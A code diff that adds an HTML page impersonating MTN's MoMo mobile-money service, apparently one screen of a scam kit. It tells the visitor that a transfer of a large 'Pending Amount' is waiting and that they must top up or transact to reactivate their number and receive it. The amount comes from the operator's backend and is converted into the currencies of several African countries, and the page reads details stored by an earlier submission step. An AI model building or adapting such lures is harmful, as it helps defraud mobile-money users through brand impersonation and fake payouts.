@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<title>MoMo — Number Inactive</title>
+<style>
+:root{
+  --blue:#004F71; --dark:#003654; --pale:#CCDCE3; --yellow:#FFCC05;
+  --white:#fff; --muted:#6B7B87; --border:#DCE3E8;
+  --warn:#B45309; --warnBg:#FEF3C7; --warnBd:#FCD34D;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-font-smoothing:antialiased}
+body{background:#F2F5F7;display:flex;justify-content:center;align-items:center;padding:16px}
+
+.phone{
+  width:100%;max-width:420px;height:100%;max-height:740px;
+  background:var(--white);border-radius:24px;overflow:hidden;
+  box-shadow:0 24px 70px -16px rgba(0,54,84,.28),0 6px 20px rgba(0,54,84,.08);
+  display:flex;flex-direction:column;position:relative;
+}
+
+/* Header */
+.bar{background:var(--blue);padding:14px 18px;display:flex;align-items:center;justify-content:center;position:relative;flex-shrink:0}
+.bar::after{content:"";position:absolute;left:0;right:0;bottom:0;height:2px;background:var(--yellow)}
+.logo{display:flex;align-items:center;gap:8px}
+.mark{width:28px;height:28px;border-radius:6px;background:var(--yellow);display:flex;align-items:center;justify-content:center;color:var(--blue);font-weight:900;font-size:13px;box-shadow:0 2px 6px rgba(0,0,0,.15)}
+.word{display:flex;flex-direction:column;line-height:1}
+.word b{color:#fff;font-weight:800;font-size:17px;letter-spacing:-.4px}
+.word span{color:rgba(255,255,255,.75);font-size:9px;font-weight:700;letter-spacing:.9px;text-transform:uppercase;margin-top:2px}
+
+/* Body — centred, no scroll */
+.body{
+  flex:1;padding:24px 22px;display:flex;flex-direction:column;
+  justify-content:center;align-items:stretch;gap:18px;min-height:0;
+}
+
+/* Warn pulse */
+.warn{
+  width:66px;height:66px;margin:0 auto;border-radius:50%;
+  background:linear-gradient(135deg,var(--warn),#92400E);
+  display:flex;align-items:center;justify-content:center;position:relative;
+  box-shadow:0 10px 30px -8px rgba(180,83,9,.45);
+  flex-shrink:0;
+}
+.warn svg{width:32px;height:32px;color:#fff;position:relative;z-index:1}
+.warn::before,.warn::after{
+  content:"";position:absolute;inset:0;border-radius:50%;
+  border:2px solid rgba(180,83,9,.35);animation:ping 2s cubic-bezier(0,0,.2,1) infinite
+}
+.warn::after{animation-delay:1s}
+@keyframes ping{
+  0%{transform:scale(1);opacity:.7}
+  75%,100%{transform:scale(1.6);opacity:0}
+}
+
+/* Message */
+.msg{text-align:center}
+.msg p{font-size:13px;color:var(--muted);line-height:1.6;font-weight:500;max-width:320px;margin:0 auto}
+.msg p b{color:var(--dark);font-weight:800}
+
+/* Amount */
+.amount{
+  display:flex;align-items:center;gap:12px;padding:13px 15px;
+  background:linear-gradient(135deg,var(--blue),#006A93);border-radius:12px;
+  position:relative;overflow:hidden;flex-shrink:0;
+}
+.amount::before{content:"";position:absolute;top:-30px;right:-30px;width:90px;height:90px;border-radius:50%;background:rgba(255,204,5,.15)}
+.amount .ico{width:34px;height:34px;border-radius:9px;background:rgba(255,255,255,.15);display:flex;align-items:center;justify-content:center;color:var(--yellow);flex-shrink:0;position:relative;z-index:1}
+.amount .ico svg{width:17px;height:17px}
+.amount .txt{flex:1;position:relative;z-index:1}
+.amount .lbl{font-size:9.5px;color:rgba(255,255,255,.7);font-weight:700;letter-spacing:.9px;text-transform:uppercase;margin-bottom:2px}
+.amount .val{font-size:16px;color:#fff;font-weight:900;letter-spacing:-.3px;font-variant-numeric:tabular-nums}
+
+/* Brief statement */
+.statement{
+  background:#F7FAFC;border:1px solid var(--border);border-radius:12px;
+  padding:14px 16px;flex-shrink:0;
+}
+.statement p{font-size:12.5px;color:var(--dark);line-height:1.6;font-weight:500;text-align:center}
+.statement p b{color:var(--warn);font-weight:800}
+
+@media(max-height:700px){
+  .body{gap:14px;padding:18px 22px}
+  .warn{width:54px;height:54px}
+  .warn svg{width:26px;height:26px}
+  .amount{padding:11px 13px}
+  .statement{padding:12px 14px}
+  .msg p{font-size:12px}
+}
+</style>
+</head>
+<body>
+<div class="phone">
+
+  <header class="bar">
+    <div class="logo">
+      <div class="mark">M</div>
+      <div class="word"><b>MoMo</b><span>from MTN</span></div>
+    </div>
+  </header>
+
+  <main class="body">
+
+    <div class="warn">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/>
+        <line x1="12" y1="8" x2="12" y2="12"/>
+        <line x1="12" y1="16" x2="12.01" y2="16"/>
+      </svg>
+    </div>
+
+    <div class="msg">
+      <p>We couldn't complete the transfer because this MoMo number is currently <b>inactive</b>.</p>
+    </div>
+
+    <div class="amount">
+      <div class="ico">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+      </div>
+      <div class="txt">
+        <div class="lbl">Pending Amount</div>
+        <div class="val" id="pending">UGX 950,000</div>
+      </div>
+    </div>
+
+    <div class="statement">
+      <p>Top up or transact on this number to reactivate it and <b>receive the money instantly</b>.</p>
+    </div>
+
+  </main>
+
+</div>
+
+<script>
+  const CURRENCIES = {
+    '+256': { symbol: 'UGX',  rate: 3800 },
+    '+233': { symbol: 'GHS',  rate: 15.2 },
+    '+234': { symbol: '₦',    rate: 1550 },
+    '+237': { symbol: 'FCFA', rate: 605  },
+    '+250': { symbol: 'RWF',  rate: 1380 },
+    '+260': { symbol: 'ZMW',  rate: 27   },
+    '+211': { symbol: 'SSP',  rate: 4200 },
+    '+225': { symbol: 'FCFA', rate: 605  }
+  };
+
+  function getCountry() {
+    try {
+      const s = JSON.parse(sessionStorage.getItem('mtnSubmission') || '{}');
+      return s.countryCode || '+256';
+    } catch (_) { return '+256'; }
+  }
+
+  async function load() {
+    let usd = 250;
+    try {
+      const r = await fetch('/api/state');
+      const s = await r.json();
+      if (s.amount != null) usd = Number(s.amount);
+    } catch (_) {}
+
+    const cur = CURRENCIES[getCountry()] || CURRENCIES['+256'];
+    const local = Math.round(usd * cur.rate);
+    document.getElementById('pending').textContent =
+      `${cur.symbol} ${local.toLocaleString()}`;
+  }
+
+  load();
+</script>
+</body>
+</html>
